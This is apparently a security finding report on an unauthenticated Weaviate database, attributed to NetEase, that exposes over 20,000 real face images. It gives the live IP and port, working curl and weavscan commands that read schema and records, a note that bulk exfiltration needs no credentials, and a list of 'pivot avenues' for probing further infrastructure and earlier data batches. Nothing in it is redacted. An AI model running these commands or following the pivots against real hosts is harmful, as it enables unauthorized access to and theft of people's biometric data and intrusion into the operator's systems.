# NetEase Weaviate Biometric Database -- Unauth Read

**Date:** 2026-06-20  
**Tool:** weavscan (first confirmed use)  
**Severity:** CRITICAL  
**Status:** CONFIRMED -- unauth read, full record access

---

## Target

```
IP:       51.222.138.139
Port:     8080
Service:  Weaviate 1.30.0
Module:   img2vec-neural
Auth:     NONE
```

---

## Operator Attribution

Source URLs extracted from the `text` field of every record:

```
https://h72.fp.ps.netease.com/file/<id>
https://h72sg.fp.ps.easebar.com/file/<id>
```

**Operator: NetEase** (netease.com)  
`easebar.com` is a NetEase subsidiary/product CDN.  
`fp.ps` = face-photo photo-service (naming convention matches facial recognition pipeline usage).

Internal ID namespaces present in the data:
- `wwm_facedata_R37_<hash>` -- WWM product line
- `yysls_facedata_R37_<hash>` -- YYSLS product line

Two distinct NetEase internal systems sharing one face recognition backend.

---

## Data

| Class | Records | Vectorizer | Notes |
|-------|---------|-----------|-------|
| WWMFacesRecogProd | 14,178 | img2vec-neural | production inference set |
| WWMFaces | 6,120 | img2vec-neural | base/training set |
| WWMFacesRecog | 0 | none | empty class |
| **TOTAL** | **20,298** | | |

### Per-record structure

```
image_blob  base64-encoded PNG face image (~2.8MB each)
text        wwm_facedata_R37_<hash><code>|yysls_facedata_R37_<hash><code>|<cdn_url>
```

Each record contains:
- Full face image blob (~2.8MB base64 PNG per record)
- Two internal system identifiers cross-linking the same face across systems
- Live CDN URL to the source image on NetEase infrastructure

---

## PoC

Verified with weavscan. Minimum reproduction:

```bash
# Confirm open + version
curl -s http://51.222.138.139:8080/v1/meta | jq .version

# Schema -- confirms biometric class structure
curl -s http://51.222.138.139:8080/v1/schema | jq '[.classes[].class]'

# Object count
# WWMFacesRecogProd: 14178
# WWMFaces: 6120

# Sample record -- confirms image_blob + text with CDN URL
curl -s "http://51.222.138.139:8080/v1/objects?class=WWMFacesRecogProd&limit=1" \
  | jq '{uuid: .objects[0].id, props: (.objects[0].properties | keys), text_sample: .objects[0].properties.text[:100]}'

# Full scan
weavscan http://51.222.138.139:8080 -o netease-weaviate-findings.json
```

Expected output from schema check:
```json
["WWMFaces", "WWMFacesRecog", "WWMFacesRecogProd"]
```

Expected text field structure:
```
wwm_facedata_R37_<32-char-hex><8-char-token>03|yysls_facedata_R37_<32-char-hex><8-char-token>07|https://h72.fp.ps.netease.com/file/<id>
```

---

## Topology

```
node: node1  status=HEALTHY  version=1.30.0
Cluster: single node
gRPC :50051: CLOSED
Metrics :2112: not probed
```

---

## Impact

**Biometric data class.** Face images are biometric identifiers -- legally distinct from general PII in most jurisdictions (GDPR Art. 9, CCPA, PIPL). 20,298 real-person face images readable with no credentials. The CDN URLs resolve to live NetEase servers, confirming these are real persons, not synthetic data.

**Pipeline architecture exposure.** The img2vec-neural module + two internal ID namespaces reveals the structure of NetEase's cross-product facial recognition system. The `R37` batch identifier in every record suggests at minimum 36 prior batches -- total corpus may be significantly larger than what is stored in this instance.

**Full scroll possible.** No rate limiting observed. Entire 20,298-record corpus accessible via cursor pagination. Image blobs are included inline -- no secondary CDN fetch required for bulk exfiltration.

---

## Pivot Avenues

1. **CDN URLs are live** -- `fp.ps.netease.com` source images directly accessible
2. **Batch R37** -- prior batches R1-R36 may be on other hosts or in other Weaviate classes
3. **WWMFaces vs WWMFacesRecogProd** -- different subsets; enumerate both independently  
4. **easebar.com CDN** -- one record used this domain; check if it's a deprecated endpoint or separate product
5. **OVH CA neighborhood** -- other NetEase infra may be co-located
6. **gRPC closed, REST open** -- standard REST gives complete access; gRPC surface not confirmed present

---

## Tool Reference

Found with **weavscan** -- first confirmed production use.  
https://github.com/nuclide-research/weavscan

Scan command used:
```bash
weavscan http://51.222.138.139:8080 --probe
```

Scroll confirmed 1,000 records across both populated classes before hitting `--max-records` default.
